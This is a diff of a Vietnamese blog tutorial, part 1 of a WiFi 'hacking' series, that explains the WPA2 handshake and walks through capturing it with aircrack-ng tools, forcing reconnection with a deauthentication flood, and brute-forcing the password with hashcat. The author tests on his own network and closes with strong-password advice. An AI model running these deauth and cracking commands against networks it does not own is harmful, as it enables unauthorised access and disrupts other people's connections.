@@ -1,8 +1,9 @@
 # Nghịch vài trò "hack" Wifi - Phần 1
-Như đã đề cập ở blog trước, thời gian đầu mình sử dụng Linux với mong ước là xử được mấy cái wifi nhà hàng xóm.
-Sau quá trình trên, mình cũng có một chút kinh nghiệm, cũng như một số tip. Trong series này, mình sẽ tổng hợp lại 1 số kiến thức cũng như 1 số tip mình tìm hiểu được. Biết đâu lại có thêm một trò vui vui :). 
 
-## Tổng quan
+Như đã đề cập ở blog trước, thời gian đầu mình sử dụng Linux với mong ước là xử được mấy cái wifi nhà hàng xóm.
+Sau quá trình trên, mình cũng có một chút kinh nghiệm, cũng như một số tip. Trong series này, mình sẽ tổng hợp lại 1 số kiến thức cũng như 1 số tip mình tìm hiểu được. Biết đâu lại có thêm một trò vui vui.
+
+# Tổng quan
 
 Hầu hết các modem wifi trên thị trường hiện nay được sử dụng có 3 chuẩn bảo mật chính WPA, WPA2, WEP. Trong đó WPA và WEP là 2 chuẩn bảo mật yếu rất dễ tấn công nên dần được loại bỏ, do đó chuẩn bảo mật phổ biến hiện nay là WPA2. WPA2 là 1 chuẩn bảo mật hiện đại, sử dụng những công nghệ tiên tiến nhưng không có nghĩa là nó an toàn 100%. Theo hiểu biết của mình, hiện tại có 3 cách để hack như sau:
 
@@ -10,13 +11,13 @@ Hầu hết các modem wifi trên thị trường hiện nay được sử dụn
 - Hack tấn công mã pin - Lợi dụng sơ hở WPS
 - Hack bằng Phishing - Lợi dụng sự mất cảnh giác của người dùng đánh cắp password
 
-## Hack bằng từ điển
+# Hack bằng từ điển
 
-### Giới thiệu
+## Giới thiệu
 
 Cách này nghe cái tên thì cứ nghĩ nó là dạng brute-force trâu bò, ờ thì đúng thế thật, nhưng bên trong nó còn có rất nhiều vấn đề để nói. Trong blog này, mình sẽ trình bày và thử nghiệm kĩ thuật hack bằng từ điển.
 
-### 4-Way Handshake
+## 4-Way Handshake
 
 Trước tiên, chúng ta tìm hiểu quá trình xác thực bắt tay bốn bước của WPA2. Để một Client có thể kết nối với AP (Access Point) phải trả qua quá trình 4 bước như sau:
 
@@ -34,13 +35,13 @@ Giải thích một lúc quá trình này méo hết cả miệng. Nói chung đ
 Lợi dụng điểm này, ta can thiệp vào quá trình xác thực và bắt lấy gói GTK, từ đó tìm ra khóa PTK -> mã PSK (mã hash mật khẩu).
 Tới đây mới bắt đầu dùng từ điển, chúng ta có 1 danh sách các mật khẩu phổ biến, hoặc vét cạn toàn bộ, hash nó ra và so khớp với mật khẩu. Nếu trùng thì chính là mật khẩu đấy :))
 
-### Thực chiến
+## Thực chiến
 
 Một số thứ cần chuẩn bị:
 
-- <a href="https://www.aircrack-ng.org/doku.php">Aircrack-ng</a>: Tool phổ biến nhất để chuyển chế độ monitor và bắt gói tin 
-- <a href="https://github.com/hashcat/hashcat-utils">Cap2hccapx</a>: Tool hỗ trợ chuyển đổi file cap thành hccapx
-- <a href="https://hashcat.net/hashcat/">Hashcat</a>: Thư viện hỗ trợ giải mã chuỗi hash
+- [Aircrack-ng](https://www.aircrack-ng.org/doku.php): Tool phổ biến nhất để chuyển chế độ monitor và bắt gói tin
+- [Cap2hccapx](https://github.com/hashcat/hashcat-utils): Tool hỗ trợ chuyển đổi file cap thành hccapx
+- [Hashcat](https://hashcat.net/hashcat/): Thư viện hỗ trợ giải mã chuỗi hash
 - Từ điển: Nếu có từ điển thì sẽ tăng khả năng cao hơn khi dò, nếu không thì hashcat hỗ trợ dò tìm kiểu brute-force.
 
 Mình có tổng hợp 1 list kha khá từ điển, nếu cần có thể ib mình.
@@ -48,29 +49,50 @@ Mình có tổng hợp 1 list kha khá từ điển, nếu cần có thể ib m�
 Các Tool trên không nhất thiết phải sử dụng Kali Linux mà có thể cài ở bất kì distro nào. Ở đây mình sử dụng Kali Linux do nó cài sẵn nhiều Tool hỗ trợ.
 Một vấn đề nữa là card wifi sử dụng phải hỗ trợ chế độ monitor, ở đây mình dùng TP-link WN722N V1.
 
-<img src="https://crowi.pionero.io/files/610edcc41120630068a6a65e"  width="400px" height="300px">
+![card wifi](https://github.com/Ducvoccer/blog/blob/main/images/hack-wifi-p1/cardwifi.jpg?raw=true)
 
-Đầu tiên, mở terminal, sử dụng lệnh:  `airmon-ng`
-để kiểm tra tên của card wifi. Ở đây chúng ta tìm thấy card wifi có tên là wlan0.
+Đầu tiên, mở terminal, sử dụng lệnh:
 
-<img src="https://crowi.pionero.io/files/610edd4c1120630068a6a660" height="150px">
+```
+# airmon-ng
+```
 
-Tắt toàn bộ tiến trình đang sử dụng tới mạng:  `airmon-ng check kill`.
+![Airmon-ng](https://github.com/Ducvoccer/blog/blob/main/images/hack-wifi-p1/airmon-ng1.png?raw=true)
+để kiểm tra tên của card wifi. Ở đây chúng ta tìm thấy card wifi có tên là `wlan0`.
 
-<img src="https://crowi.pionero.io/files/610edd4c1120630068a6a65f" height="150px">
+Tắt toàn bộ tiến trình đang sử dụng tới mạng:
 
-Tiếp theo chúng ta bật chế độ monitor lên cho wlan0: `airmon-ng start wlan0`.
+```
+# airmon-ng check kill
+```
 
-<img src="https://crowi.pionero.io/files/610ee1381120630068a6a66c" height="150px">
+![Kill process](https://github.com/Ducvoccer/blog/blob/main/images/hack-wifi-p1/airmon-checkkill.png?raw=true)
 
-Kiểm tra lại để chắc chắn card wifi đã ở chế độ monitor: `airmon-ng`.
+Tiếp theo chúng ta bật chế độ monitor lên cho wlan0:
 
-<img src="https://crowi.pionero.io/files/610edd4c1120630068a6a663" height="150px">
+```
+# airmon-ng start wlan0
+```
+
+![Airmon-ng start](https://github.com/Ducvoccer/blog/blob/main/images/hack-wifi-p1/airmon-start.png?raw=true)
+
+Kiểm tra lại để chắc chắn card wifi đã ở chế độ monitor:
+
+```
+# airmon-ng
+```
+
+![Airmon-ng](https://github.com/Ducvoccer/blog/blob/main/images/hack-wifi-p1/airmon-ng2.png?raw=true)
 
 Chúng ta đã có 1 monitor là wlan0mon.
-Quét tất cả các AP xung quanh: `airodump-ng wlan0mon`.
 
-<img src="https://crowi.pionero.io/files/610edd4c1120630068a6a666" height="550px">
+Quét tất cả các AP xung quanh:
+
+```
+# airodump-ng wlan0mon
+```
+
+![Airodump-ng](https://github.com/Ducvoccer/blog/blob/main/images/hack-wifi-p1/airodump-ng.png?raw=true)
 
 Để ý các chỉ số:
 
@@ -81,56 +103,67 @@ Quét tất cả các AP xung quanh: `airodump-ng wlan0mon`.
 
 Sau khi có thông số trên, ta chọn 1 AP để thực hiện lắng nghe - ở đây mình chọn luôn wifi phòng mình nhé.
 
-`airodump-ng wlan0mon --bssid <BSSID> -c <CH> -w <file_output.cap>`
+```
+# airodump-ng wlan0mon --bssid <BSSID> -c <CH> -w <file_output.cap>
+```
 
-<img src="https://crowi.pionero.io/files/610ee5451120630068a6a671" height="300px">
+![Airodump-ng](https://github.com/Ducvoccer/blog/blob/main/images/hack-wifi-p1/airodump-ng-1.png?raw=true)
 
 Sử dụng aireplay-ng để tấn công gửi các dead-auth cho AP với mục đích khiến AP yêu cầu các Client phải gửi lại xác thực - tức là làm lại quá trình bắt tay 4 bước.
 
-`iw dev wlan0mon set channel <CH> & aireplay-ng --deauth 20 -a <BSSID> wlan0mon`
+```
+# iw dev wlan0mon set channel <CH> & aireplay-ng --deauth 20 -a <BSSID> wlan0mon
+```
 
-<img src="https://crowi.pionero.io/files/610ee34e1120630068a6a670" height="500px">
+![Send deadauth](https://github.com/Ducvoccer/blog/blob/main/images/hack-wifi-p1/deadauth.png?raw=true)
 
 Nếu có lỗi Channel, chạy lại câu lệnh phía trên 1 lần nữa.
 
 Sau khi có 1 Client xác thực lại, chúng ta chú ý góc bên phải, có 1 Handshake.
-
-<img src="https://crowi.pionero.io/files/610edd4c1120630068a6a664" heigh="350px">
+![Found Handshake](https://github.com/Ducvoccer/blog/blob/main/images/hack-wifi-p1/airodump-bssid.png?raw=true)
 
 Ngừng quá trình lắng nghe bằng Ctrl + C.
 
 Sau khi có file .cap, chúng ta sử dụng cap2hccapx để convert file .cap thành .hccapx phục vụ cho hashcat.
-`cap2hccapx.bin <file.cap> <file.hccapx>`
 
-<img src="https://crowi.pionero.io/files/610ee28c1120630068a6a66f">
+```
+# cap2hccapx.bin <file.cap> <file.hccapx>
+```
+
+![Convert cap file](https://github.com/Ducvoccer/blog/blob/main/images/hack-wifi-p1/cap-convert.png?raw=true)
 
 Sau khi có file hccapx, ta có thể giải mã ở bất kì đâu, chọn máy nào mạnh mạnh có card rời chút thì càng tốt. Ở đây mình chọn Google Colab để giải mã nó luôn :) vừa free lại mạnh nữa chứ.
 Tại google colab tải file .hccapx lên.
-
-<img src="https://crowi.pionero.io/files/610ee2561120630068a6a66e">
+![Google colab](https://github.com/Ducvoccer/blog/blob/main/images/hack-wifi-p1/colab-file.png?raw=true)
 
 Cài đặt 1 số thứ cần thiết cho hashcat:
-`!apt install cmake build-essential checkinstall -y > /dev/null && git clone https://github.com/hashcat/hashcat.git > /dev/null && cd hashcat && git submodule update --init && make > /dev/null && make install > /dev/null && cd .. && rm hashcat -r`
 
-<img src="https://crowi.pionero.io/files/610ee20f1120630068a6a66d" height="200px">
+```
+# !apt install cmake build-essential checkinstall -y > /dev/null && git clone https://github.com/hashcat/hashcat.git > /dev/null && cd hashcat && git submodule update --init && make > /dev/null && make install > /dev/null && cd .. && rm hashcat -r
+```
+
+![Install package](https://github.com/Ducvoccer/blog/blob/main/images/hack-wifi-p1/install.png?raw=true)
 
 Sử dụng lệnh sau để bắt đầu chạy hashcat:
-`!hashcat -m 2500 -a 3 /content/room_402.hccapx -i --increment-min=8 ?d?d?d?d?d?d?d?d?d`
-<img src="https://crowi.pionero.io/files/610edd4d1120630068a6a66a" heigh="350px">
+
+```
+# !hashcat -m 2500 -a 3 /content/room_402.hccapx -i --increment-min=8 ?d?d?d?d?d?d?d?d?d
+```
+
+![HashCat start](https://github.com/Ducvoccer/blog/blob/main/images/hack-wifi-p1/hashcat-start.png?raw=true)
 
 -m 2500: Chọn kiểu mã hóa là WPA-EAPOL-PBKDF2
 -a 3: Chọn mode tấn công là brute-force
 -i --increment-min=8: kích hoạt chế độ tìm kiếm tăng dần với khởi đầu là 8
 ?d?d?d?d?d?d?: 00000000 -> 999999999
 
-Để tìm hiểu thêm, xem ở: https://hashcat.net/wiki/doku.php?id=hashcat
+Để tìm hiểu thêm, xem ở: [Hashcat](https://hashcat.net/wiki/doku.php?id=hashcat)
 Giờ chỉ có việc ngồi chờ thôi, thời gian nhanh hay chậm tùy thuộc vào kinh nghiệm lựa chọn từ điển cũng như độ khó của mật khẩu.
-Và đây là thành quả sau khoảng 5p chờ đợi, mật khẩu nhà mình khá là đơn giản nhỉ :)
+Và đây là thành quả sau khoảng 5p chờ đợi, mật khẩu nhà mình khá là đơn giản nhỉ.
+![HashCat founded](https://github.com/Ducvoccer/blog/blob/main/images/hack-wifi-p1/hashcat-find.png?raw=true)
 
-<img src="https://crowi.pionero.io/files/610edd4d1120630068a6a669" heigh="350px">
+# Kết
 
-## Kết
-
-Kĩ thụât hack wifi dựa trên tấn công từ điển là kĩ thuật rất bình thường nhưng vẫn có độ hiểu quả cao, do cách đặt mật khẩu của người Việt còn đơn giản. Do đó để an toàn và chống lại cách hack từ điển, chúng ta nên đặt mật khẩu đủ mạnh, độ dài lớn kết hợp hoa thường số và sử dụng kí tự đặc biệt. 
+Kĩ thụât hack wifi dựa trên tấn công từ điển là kĩ thuật rất bình thường nhưng vẫn có độ hiểu quả cao, do cách đặt mật khẩu của người Việt còn đơn giản. Do đó để an toàn và chống lại cách hack từ điển, chúng ta nên đặt mật khẩu đủ mạnh, độ dài lớn kết hợp hoa thường số và sử dụng kí tự đặc biệt.
 Sang blog tiếp theo, mình sẽ giới thiệu kĩ thuật tiếp theo - lợi dụng WPS.
-Mục đích blog để học tập, nếu có bất cứ vấn đề gì liên quan, mình hoàn toàn không chịu trách nhiệm :))
+Mục đích blog để học tập, hãy thận trọng khi làm.
